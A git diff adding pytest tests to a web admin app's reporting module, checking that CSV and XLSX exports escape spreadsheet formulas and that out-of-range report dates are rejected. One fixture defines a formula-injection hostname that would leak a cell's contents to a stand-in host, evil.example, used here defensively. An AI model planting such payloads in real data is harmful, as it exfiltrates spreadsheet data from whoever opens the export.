@@ -1,9 +1,13 @@
 """Halaman Admin, hak akses per role, Audit Log, laporan, dan aturan CSP template."""
+import csv
+import io
 import re
 
 import pytest
+from openpyxl import load_workbook
 
-from tests.conftest import enroll, enrollment_key, htmx_headers, login, make_user, online_host, sql
+from app.core.export import csv_safe
+from tests.conftest import approve, enroll, enrollment_key, htmx_headers, login, make_user, online_host, sql
 
 ADMIN_ONLY = ["/agents", "/users", "/users?tab=roles", "/audit", "/audit/export.csv", "/hosts/folders",
               "/reports?report=remote"]
@@ -144,3 +148,50 @@ async def test_reports_preview_and_download(client, report):
     printed = await client.get(f"/reports/print?report={report}")
     assert printed.status_code == 200 and 'data-action="print"' in printed.text
     assert [r[0] for r in await sql("SELECT format FROM report_downloads")] == ["xlsx", "pdf"]
+
+
+EVIL_HOSTNAME = '=HYPERLINK("http://evil.example/?"&A5,"klik")'
+
+
+async def test_exports_do_not_turn_agent_text_into_formulas(client):
+    """Hostname/inventaris berasal dari agent: di XLSX/CSV tidak boleh terbaca sebagai formula."""
+    data = await enroll(client, await enrollment_key(), EVIL_HOSTNAME)
+    await approve(data["host_id"])                   # audit "Setujui PC baru" dengan target_label = hostname
+    await make_user("adm", role="admin")
+    await login(client, "adm")
+
+    sheet = load_workbook(io.BytesIO((await client.get("/reports/download?report=inventory")).content)).active
+    cells = [c for row in sheet.iter_rows() for c in row if c.value == EVIL_HOSTNAME]
+    assert cells and all(c.data_type == "s" for c in cells)
+    assert not [c for row in sheet.iter_rows() for c in row if c.data_type == "f"]
+
+    text = (await client.get("/audit/export.csv?range=7d")).text.lstrip("\ufeff")
+    targets = [row["Target"] for row in csv.DictReader(io.StringIO(text))]
+    assert "'" + EVIL_HOSTNAME in targets and EVIL_HOSTNAME not in targets
+
+@pytest.mark.parametrize("value, expected", [
+    ("=1+2", "'=1+2"), ("+62812", "'+62812"), ("-5", "'-5"), ("@SUM(A1)", "'@SUM(A1)"), ("\tx", "'\tx"),
+    ("IGD-PC03", "IGD-PC03"), ("—", "—"), ("", ""), (12, 12), (None, None),
+])
+def test_csv_safe(value, expected):
+    assert csv_safe(value) == expected
+
+
+@pytest.mark.parametrize("url", [
+    "/reports?report=availability&from=0001-01-01&to=0001-01-02",      # dulu OverflowError → 500
+    "/reports?report=availability&from=2024-01-01&to=2026-01-01",      # > 366 hari
+    "/reports/download?report=availability&from=9999-12-30",
+    "/audit?range=custom&from=0001-01-01&to=0001-01-01",
+    "/audit/export.csv?range=custom&from=9999-12-31",
+])
+async def test_out_of_range_report_dates_are_422(client, url):
+    await make_user("adm", role="admin")
+    await login(client, "adm")
+    assert (await client.get(url)).status_code == 422
+
+
+async def test_report_range_of_one_year_is_allowed(client):
+    await make_user("adm", role="admin")
+    await login(client, "adm")
+    assert (await client.get("/reports?report=availability&from=2025-01-01&to=2025-12-31")).status_code == 200
+    assert (await client.get("/reports?report=inventory&from=2020-01-01&to=2026-01-01")).status_code == 200   # tanpa periode
